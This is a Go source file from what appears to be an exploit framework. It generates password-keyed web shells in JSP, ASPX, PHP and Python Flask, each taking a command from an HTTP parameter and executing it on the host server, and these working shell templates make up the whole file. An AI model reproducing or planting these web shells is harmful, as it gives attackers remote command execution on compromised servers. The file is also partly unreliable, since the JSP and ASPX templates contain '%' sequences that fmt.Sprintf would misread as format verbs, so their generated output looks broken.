package shellcodes

import (
	"fmt"
)

type WebShellGenerator struct{}

func NewWebShellGenerator() *WebShellGenerator {
	return &WebShellGenerator{}
}

func (wsg *WebShellGenerator) GenerateJSP(password string) (string, error) {
	if password == "" {
		password = "pocsuite"
	}

	template := `<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%
    String cmd = request.getParameter("%s");
    if (cmd != null) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            StringBuilder sb = new StringBuilder();
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            out.println(sb.toString());
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
%>`

	return fmt.Sprintf(template, password), nil
}

func (wsg *WebShellGenerator) GenerateASPX(password string) (string, error) {
	if password == "" {
		password = "pocsuite"
	}

	template := `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["%s"];
        if (!string.IsNullOrEmpty(cmd))
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmd;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                Process p = Process.Start(psi);
                string output = p.StandardOutput.ReadToEnd();
                Response.Write(output);
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + ex.Message);
            }
        }
    }
</script>`

	return fmt.Sprintf(template, password), nil
}

func (wsg *WebShellGenerator) GeneratePHP(password string) (string, error) {
	if password == "" {
		password = "pocsuite"
	}

	template := `<?php
if (isset($_GET['%s'])) {
    $cmd = $_GET['%s'];
    $output = shell_exec($cmd);
    echo $output;
}
?>`

	return fmt.Sprintf(template, password, password), nil
}

func (wsg *WebShellGenerator) GeneratePython(password string) (string, error) {
	if password == "" {
		password = "pocsuite"
	}

	template := `#!/usr/bin/env python
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def execute():
    cmd = request.args.get('%s')
    if cmd:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Error: {str(e)}"
    return "No command provided"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
`

	return fmt.Sprintf(template, password), nil
}
